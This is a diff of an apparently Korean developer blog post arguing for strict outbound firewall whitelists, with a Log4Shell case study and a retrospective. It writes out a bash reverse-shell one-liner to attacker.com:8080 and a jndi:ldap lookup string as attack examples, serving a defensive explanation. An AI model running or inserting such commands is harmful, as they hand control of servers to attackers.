@@ -108,4 +108,27 @@ $$\text{Packet Source}: 10.10.1.5 \xrightarrow{\text{Firewall}} 203.0.113.5$$
 ```bash
 # 해커가 감염된 서버에서 실행하는 명령어 예시
 # 방화벽이 Outbound ANY라면, 해커의 서버(attacker.com)로 바로 연결되어 제어권이 넘어감
-bash -i >& /dev/tcp/[attacker.com/8080](https://attacker.com/8080) 0>&1
+bash -i >& /dev/tcp/attacker.com/8080 0>&1
+```
+
+만약 우리가 `api.payment-gateway.com:443`으로만 Outbound를 제한해 두었다면?
+해커가 `attacker.com:8080`으로 접속을 시도할 때 방화벽이 **DROP** 시켜버립니다. 즉, **Outbound 정책은 침해 사고 발생 시 최후의 보루**가 됩니다.
+
+### 4.2. 실제 사례: Log4j (Log4Shell) 사태
+2021년 IT 업계를 강타한 **Log4j 사태(CVE-2021-44228)**가 대표적인 예시입니다.
+
+이 공격의 핵심 메커니즘은 로깅 라이브러리가 공격자의 LDAP 서버로 **Outbound 요청**을 보내고, 악성 자바 클래스를 다운로드 받아 실행하는 것이었습니다.
+
+$$ \text{Log("...jndi:ldap://[attacker.com/exploit](https://attacker.com/exploit)...")} \rightarrow \text{Outbound Request} $$
+
+당시 **Outbound 방화벽 정책을 엄격하게 관리(Whitelist)했던 기업**들은, Log4j 취약점이 있는 버전의 라이브러리를 사용하고 있었음에도 불구하고, 공격자가 유도한 LDAP 서버로의 접속이 차단되어 **피해를 막거나 최소화**할 수 있었습니다.
+
+## 5. 회고 및 인사이트 (Retrospective)
+
+이번 API 연동 작업을 통해 단순히 "통신이 되게 하는 것"을 넘어, 네트워크 흐름과 보안의 상관관계를 다시 한번 정리할 수 있었습니다.
+
+1.  **Stateful Inspection:** 방화벽은 똑똑하다. 요청한 놈에게 돌아오는 응답은 기억해 준다.
+2.  **Least Privilege (최소 권한의 원칙):** 방화벽 신청 시 "귀찮으니 대역으로 열어주세요" 하지 말자. 그 귀찮음이 해킹을 막는 방패가 된다.
+3.  **Developer's Responsibility:** 인프라 보안은 인프라 팀만의 책임이 아니다. 개발자도 내 애플리케이션이 **'어디로', '왜'** 나가는지 명확히 인지하고 통제해야 한다.
+
+앞으로 Jira 티켓을 끊을 때, 패킷 하나하나의 무게감을 느끼며 작성하게 될 것 같습니다.
